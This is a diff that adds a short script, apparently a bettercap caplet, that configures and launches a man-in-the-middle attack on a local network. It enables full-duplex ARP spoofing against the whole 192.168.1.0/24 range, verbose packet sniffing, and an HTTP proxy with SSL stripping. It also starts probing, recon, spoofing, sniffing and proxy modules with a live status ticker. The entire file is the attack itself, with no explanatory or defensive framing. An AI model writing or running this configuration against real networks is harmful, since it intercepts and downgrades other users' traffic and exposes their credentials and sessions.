@@ -1,0 +1,16 @@
+# Comments start with #
+# Set parameters:
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.0/24
+set net.sniff.verbose true
+set http.proxy.sslstrip true
+# Start modules in order:
+net.probe on
+net.recon on
+arp.spoof on
+net.sniff on
+http.proxy on
+# Live ticker dashboard:
+set ticker.commands "clear; net.show"
+set ticker.period 5
+ticker on
